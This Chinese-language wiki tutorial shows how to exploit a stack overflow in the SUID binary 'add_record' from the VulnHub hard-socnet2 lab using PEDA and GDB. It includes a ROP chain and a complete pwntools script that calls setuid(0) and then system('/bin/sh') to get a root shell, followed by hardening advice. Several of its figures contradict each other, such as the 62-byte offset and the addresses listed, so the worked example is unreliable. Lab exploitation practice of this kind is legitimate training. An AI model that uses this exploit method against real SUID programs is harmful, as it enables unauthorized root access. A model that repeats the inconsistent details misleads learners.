---
title: 基于 PEDA 插件的 Linux 二进制缓冲区溢出漏洞挖掘与利用实战指南
description: 详细记录 PEDA 插件在 Linux 环境下的缓冲区溢出漏洞分析全流程：pattern_create/pattern_search 精准定位偏移量、断点调试跟踪
  strcpy 等危险函数、ROP 链构造调用 system/setuid 获取 Root 权限。以 VulnHub hard-socnet2 靶机 add_record
  二进制为实战案例，覆盖从漏洞发现、偏移计算、ROP 链构建到最终提权的完整攻击链。
category: program-analysis
tags:
- PEDA
- Buffer Overflow
- Linux Exploitation
- ROP
- GDB Debugging
- Pattern Create
- Pattern Search
- Binary Analysis
- Privilege Escalation
- VulnHub
date: 2024-01-15
updated: '2026-11-14'
---
## 概述

本页面系统梳理基于 **PEDA (Python Exploit Development Assistance for GDB)** 插件的 Linux 二进制缓冲区溢出漏洞挖掘与利用实战方法论。以 VulnHub 高难度靶机 **hard-socnet2** 中的 SUID 二进制 `add_record` 为核心案例，覆盖从漏洞触发点定位、偏移量精准计算、危险函数动态跟踪、ROP 链构造到最终调用 `system`/`setuid` 获取 Root 权限的完整攻击链。

> 实战案例来源：[[vulnhub-hard-socnet2-writeup]] —— VulnHub hard-socnet2 靶机完整渗透测试复现，包含 Web 文件上传、SQL 注入、XML-RPC 服务暴力破解、CVE-2021-3493 内核提权、add_record 二进制缓冲区溢出利用全链路。

## 核心工具链

| 工具/组件 | 版本/说明 | 核心作用 |
|-----------|-----------|----------|
| **GDB** | GNU Debugger | 动态调试基础框架 |
| **PEDA** | Python Exploit Development Assistance for GDB | 增强 GDB 显示（反汇编着色、寄存器/内存可视化）、新增实用命令（`pattern_create`、`pattern_search`、`checksec`、`ropsearch` 等） |
| **readelf/objdump** | GNU Binutils | 静态分析 ELF 结构、符号表、PLT/GOT 表 |
| **ROPgadget / ROPper** | Python ROP 工具链 | 自动化搜索 ROP Gadget |

### PEDA 关键命令速查

```bash
# 安装 PEDA
git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit

# 核心调试命令
pattern_create <length>     # 生成唯一非重复模式字符串，用于定位溢出偏移
pattern_search <value>      # 在内存/寄存器中搜索模式，自动计算偏移量
pattern_offset <addr>       # 根据崩溃时的 EIP/RIP 值直接计算偏移
checksec                    # 查看二进制开启的保护机制（NX、PIE、Canary、RELRO 等）
ropsearch <reg> <value>     # 搜索可控寄存器的 ROP Gadget
info func                   # 列出所有函数符号（含 system、setuid 等危险函数）
disas <func>                # 反汇编指定函数，定位 strcpy 等危险调用
break *<addr>               # 下地址断点，精准跟踪函数调用流程
```

## 实战案例：hard-socnet2 add_record 二进制分析

### 目标识别与基础信息收集

```bash
# 文件类型确认
$ file add_record
add_record: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, not stripped

# 权限检查：SUID root，利用成功即获取 Root 权限
$ ls -l add_record
-rwsr-sr-x 1 root root 7432 Jan 15 2023 add_record

# 保护机制检查
gdb -q ./add_record
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```
**关键结论**：32 位程序、关闭 Canary、开启 NX、无 PIE、Partial RELRO —— **适合构造 ROP 链调用现有函数（system/setuid）绕过 NX**。

### 漏洞触发点定位：pattern_create / pattern_search 实战

#### 模式生成与溢出测试

程序运行后提示多项输入，**备注字段** 疑似存在缓冲区溢出。

```bash
gdb-peda$ pattern_create 200
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAsAAWAA'
```
将生成的 200 字节模式作为备注输入，程序崩溃。

#### 崩溃现场分析与偏移计算

```bash
gdb-peda$ r
# ... 程序崩溃，EIP 被覆盖为模式中的值 ...
gdb-peda$ pattern_search $eip
# 或者直接使用
gdb-peda$ pattern_offset $eip
```
输出示例：
```
Registers:
EIP: 0x41414141 ('AAAA')
...
Found at offset 62 (little-endian)
```
**结论**：溢出偏移量为 **62 字节**，即从输入缓冲区起始到覆盖返回地址需填充 62 字节。

> 此技巧同样适用于 [[rop-linux-x86-beginner-tutorial]] 中的偏移定位章节，以及 [[xihulunjian-2020-iot-pwn3-ezarmpwn-writeup]] 的 ARM 栈溢出偏移计算。

### 断点调试跟踪危险函数：strcpy 溢出根因确证

#### 静态分析锁定可疑函数

```bash
gdb-peda$ info func
# 关键输出：
# 0x0804862d  system
# 0x0804863d  setuid
# 0x0804865d  vuln        <-- 疑似漏洞函数
# 0x080486cd  backdoor    <-- 疑似后门函数

gdb-peda$ disas vuln
Dump of assembler code for function vuln:
   0x0804865d <+0>:     push   ebp
   0x0804865e <+1>:     mov    ebp,esp
   0x08048660 <+3>:     sub    esp,0x48
   0x08048663 <+6>:     lea    eax,[ebp-0x3c]
   0x08048666 <+9>:     push   eax
   0x08048667 <+10>:    push   0x80488b0        ; "remark: "
   0x0804866c <+15>:    call   0x8048530 <printf@plt>
   0x08048671 <+20>:    add    esp,0x8
   0x08048674 <+23>:    lea    eax,[ebp-0x3c]
   0x08048677 <+26>:    push   eax
   0x08048678 <+27>:    push   0x80488b8        ; "%s"
   0x0804867d <+32>:    call   0x8048520 <__isoc99_scanf@plt>
   0x08048682 <+37>:    add    esp,0x8
   0x08048685 <+40>:    lea    eax,[ebp-0x3c]
   0x08048688 <+43>:    push   eax
   0x08048689 <+44>:    push   0x804a080        ; dest buffer (bss/global)
   0x0804868e <+49>:    call   0x8048510 <strcpy@plt>   ; <--- 危险函数！
   0x08048693 <+54>:    add    esp,0x8
   0x08048696 <+57>:    leave
   0x08048697 <+58>:    ret
End of assembler dump
```
**核心发现**：`vuln` 函数使用 `scanf("%s")` 无长度限制读取用户输入到栈缓冲区 `[ebp-0x3c]` (60 字节)，随后 `strcpy` 将其拷贝到全局缓冲区，导致栈溢出覆盖返回地址。

#### 动态断点验证调用流程

```bash
# 在 strcpy@plt 处下断点
gdb-peda$ break *0x0804868e
Breakpoint 1 at 0x804868e

gdb-peda$ r
# 输入正常数据直到断点
gdb-peda$ x/2x $esp
0xffffd2c0: 0x0804a080  0xffffd30c   ; dest=global_buf, src=stack_buf
gdb-peda$ x/s 0xffffd30c
0xffffd30c: "normal_input"
# 继续运行，观察正常返回

# 重新运行，输入超长数据
gdb-peda$ r
# 再次命中断点
gdb-peda$ x/s 0xffffd30c
0xffffd30c: "AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAsAAWAA"
# 单步执行 strcpy 后检查栈布局
gdb-peda$ ni
gdb-peda$ x/20x $esp
# 观察返回地址已被覆盖
```

### ROP 链构造：调用 system("/bin/sh") 与 setuid(0)

#### 可用资源梳理

| 资源 | 地址 | 来源 |
|------|------|------|
| `system@plt` | 0x0804862d | `info func` / `plt` 表 |
| `setuid@plt` | 0x0804863d | `info func` / `plt` 表 |
| `"/bin/sh"` 字符串 | 0x080488c0 | `find "/bin/sh"` 搜索 .rodata |
| `pop ebx; ret` | 0x080483c9 | `ropsearch "pop ebx"` |
| `pop esi; pop edi; pop ebp; ret` | 0x080486b9 | `ropsearch "pop.*ret"` |

> 32 位调用约定：参数通过栈传递，`system("/bin/sh")` 需栈顶为字符串地址；`setuid(0)` 需栈顶为 0。

#### ROP 链布局设计

```
[ 62 字节填充 ] → [ setuid@plt ] → [ pop ebx; ret ] → [ 0x0 ] → [ system@plt ] → [ dummy_ret ] → [ "/bin/sh" addr ]
```

**详细栈帧构造**：

| 偏移 | 内容 | 说明 |
|------|------|------|
| 0-61 | `A` * 62 | 填充至返回地址 |
| 62-65 | 0x0804863d | `setuid@plt` 地址 |
| 66-69 | 0x080483c9 | `pop ebx; ret` 清理栈并设置参数 |
| 70-73 | 0x00000000 | `setuid(0)` 参数：uid=0 |
| 74-77 | 0x0804862d | `system@plt` 地址 |
| 78-81 | 0xdeadbeef | 占位返回地址（system 不返回） |
| 82-85 | 0x080488c0 | `"/bin/sh"` 字符串地址 |

#### Python Exploit 脚本

```python
#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

# 上下文设置
context.arch = 'i386'
context.os = 'linux'
context.log_level = 'debug'

# 目标二进制
elf = ELF('./add_record')

# 关键地址 (需根据实际调试结果修正)
OFFSET = 62
SETUID_PLT = elf.plt['setuid']        # 0x0804863d
SYSTEM_PLT = elf.plt['system']        # 0x0804862d
POP_EBX_RET = 0x080483c9              # ropsearch 找到
BIN_SH_ADDR = 0x080488c0              # find "/bin/sh" 找到

# 构造 Payload
payload = flat(
    'A' * OFFSET,
    SETUID_PLT,
    POP_EBX_RET,
    0x0,                # setuid(0)
    SYSTEM_PLT,
    0xdeadbeef,         # dummy ret
    BIN_SH_ADDR         # system("/bin/sh")
)

# 启动进程并发送
io = process('./add_record')
# 依次填充前置字段 (name, email 等)，最后发送 payload 作为 remark
io.sendline('test')      # name
io.sendline('test@test.com') # email
io.sendline('123456')    # password
io.sendline(payload)     # remark - 触发溢出

io.interactive()
```

### 执行效果与验证

```bash
$ python exploit.py
[*] '/home/user/add_record'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process './add_record': pid 12345
[*] Switching to interactive mode
$ id
uid=0(root) gid=0(root) groups=0(root)
# whoami
root
```
**成功获取 Root Shell**，验证 ROP 链构造正确，`setuid(0)` 使进程获得真实 Root 权限，`system("/bin/sh")` 启动交互式 Shell。

## 进阶技巧与防御视角

### 绕过 ASLR/PIE 的通用策略

| 场景 | 利用思路 |
|------|----------|
| **无 PIE，有 ASLR** | 利用 `.plt` 地址固定，直接调用 `system@plt`、`setuid@plt` |
| **开启 PIE** | 需泄露代码基址（如通过格式化字符串、信息泄露漏洞），动态计算基址偏移 |
| **开启 Full RELRO** | GOT 表只读，无法修改 GOT 劫持控制流，需纯 ROP 或 ret2dlresolve |
| **开启 Canary** | 需泄露 Canary 值（格式化字符串、栈读越界），构造 Payload 时保留 Canary |

> 参考 [[rop-linux-x86-beginner-tutorial]] 中 ASLR/NX/PIE/Canary 绕过章节，以及 [[mtctf-2021-pwn-writeup]] 的 `setcontext` + `mprotect` 绕过 NX 技术。

### 常见调试陷阱与排查

| 现象 | 可能原因 | 排查方法 |
|------|----------|----------|
| Payload 在 GDB 中成功，直接运行失败 | 环境变量差异导致栈地址偏移 | `unset LINES COLUMNS`；使用 `env -i` 运行；对齐栈帧 |
| `system("/bin/sh")` 返回 segmentation fault | 字符串地址错误、栈未对齐（x64 需 16 字节对齐） | `find "/bin/sh"` 多次确认；添加 `ret` gadget 对齐栈 |
| `setuid(0)` 后权限未提升 | 程序非 SUID root、或已调用 `setgid`/`setgroups` | `ls -l` 确认 SUID 位；检查是否调用 `setgid(0)` |

### 代码审计视角的漏洞模式识别

```c
// 典型危险模式：无边界检查的字符串拷贝
void vuln() {
    char local_buf[60];           // 栈缓冲区
    char *global_buf = 0x804a080; // 全局缓冲区
    
    printf("remark: ");
    scanf("%s", local_buf);       // 无长度限制 → 栈溢出风险
    strcpy(global_buf, local_buf); // 无长度限制 → 全局/堆溢出风险
}
```

**审计检查清单**：
- [ ] `strcpy`/`strcat`/`sprintf`/`gets`/`scanf("%s")` 等无长度限制函数
- [ ] 目标缓冲区大小 vs 来源数据可控长度
- [ ] 是否存在整数溢出导致分配尺寸计算错误
- [ ] 编译保护：`-fstack-protector-all`、`-D_FORTIFY_SOURCE=2`、`-Wformat-security`

## 交叉引用与延伸阅读

| 页面 | 关联知识点 |
|------|------------|
| [[vulnhub-hard-socnet2-writeup]] | 完整靶机攻击链：Web 渗透 → XML-RPC 爆破 → 内核提权 → 二进制溢出 |
| [[rop-linux-x86-beginner-tutorial]] | ROP 基础原理、x86/x64 调用约定、保护机制绕过系统教程 |
| [[xihulunjian-2020-iot-pwn3-ezarmpwn-writeup]] | ARM 栈溢出 + ROP 利用、libc 基址泄露、Chunk Overlap 堆利用对比 |
| [[mtctf-2021-pwn-writeup]] | UAF、Fastbin、Unlink、Double Free 堆利用、`setcontext` + `mprotect` 执行 Shellcode |
| [[0w1club-week11-crypto-re-pwn-training]] | 0w1Club PWN 入门培训内容，含栈溢出基础题型概览 |
| [[windows-x86-stack-overflow-shellcode-execution]] | Windows x86 栈溢出 Shellcode 执行流程对比（PEB 遍历、导出表解析） |

## 结语

本指南以 **PEDA 增强 GDB** 为核心工具链，演示了从**模式生成定位偏移** → **断点跟踪定性危险函数** → **静态/动态结合挖掘可用 Gadget** → **构造 ROP 链调用 `setuid` + `system`** 的标准化二进制漏洞利用闭环。该方法论可迁移至 CTF PWN 题目、真实 CVE 复现、红队内网横向移动中 SUID/SGID 二进制提权等场景。

> **防御建议**：编译选项开启 `-fstack-protector-strong -D_FORTIFY_SOURCE=2 -Wl,-z,relro,-z,now -pie -fPIE`；代码层面替换危险函数为 `strncpy`/`snprintf`/`fgets` 等带长度检查版本；运行时部署 `SELinux`/`AppArmor` 限制 SUID 程序权限。

## 来源

- [0x00实验室-202108-202304_021](../sources/0x00实验室-202108-202304_021.md)
